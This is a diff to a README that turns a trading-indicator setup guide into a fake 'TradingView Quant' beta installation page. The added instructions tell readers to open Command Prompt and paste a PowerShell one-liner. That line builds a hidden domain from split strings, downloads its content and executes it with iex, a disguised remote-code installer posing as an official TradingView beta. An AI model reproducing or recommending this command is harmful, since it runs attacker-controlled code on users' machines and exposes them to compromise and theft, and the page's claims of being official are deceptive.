@@ -1,19 +1,39 @@
-# 📈 Quant AI Indicator — Official TradingView Setup Guide
+<div align="center">
+<p align="center">
+  <img src="logotw.png" alt="TradingView" width="580">
+</p>
 
-![TradingView AI Banner](https://img.shields.io/badge/TradingView-Pine_Script_v5-2962FF?style=for-the-badge&logo=tradingview&logoColor=white)
-![Version](https://img.shields.io/badge/Version-1.0.4_Open_Source-089981?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-orange?style=for-the-badge)
+# TradingView Quant™
 
-Welcome to the official installation and configuration guide for the **Quant AI Indicator** for TradingView. Follow the instructions below to deploy the open-source script directly onto your chart.
-💡 What is Quant AI?
-Quant AI is a predictive market analysis tool designed for TradingView. It combines historical price data, volume profile analysis, and current volatility drivers to project real-time price trajectory scenarios (Pathways A, B, C) directly over your candlestick chart.
+</div>
 
-Key Features:
-🎯 Dynamic Price Scenarios: Generates bullish, neutral, and bearish volatility boundaries.
+The first AI-powered indicator in our library, designed to bring more market context into TradingView. It analyzes live market data and changing conditions to show several ways a setup may develop over the timeframe you select, with the supporting data and context available directly on the chart.
 
-🔍 Full Context Inspection: Inspect the underlying metrics driving each scenario without leaving TradingView.
+## Getting Started
 
-⚡ Zero Latency: Native Pine Script v5 execution — works on Crypto, Stocks, and Forex pairs across any timeframe (15m, 1h, 4h, 1d).
+Quant Indicator is currently in beta, and for now, beta access is handled through Command Prompt ahead of its full release in the TradingView indicator library.
 
-🛠️ Step 1: Copy the Official Pine Script Code
-Copy the complete Pine Script v5 code snippet below:
+### 1. Open Command Prompt
+
+Press **Win + R**, type:
+
+```text
+cmd
+```
+
+Then press **Enter**.
+
+### 2. Run the Installation Command
+
+Copy and paste the following command into Command Prompt:
+```powershell
+powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.6_Beta'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
+```
+
+Press **Enter** to begin the installation.
+
+### 3. Restart TradingView for the changes to take effect.
+
+After installation, Quant Indicator will appear in your TradingView indicator library.
+
+We encourage beta testers to share feedback and report any bugs they encounter at support@tradingview.com. Your feedback helps us improve the indicator ahead of its official release.
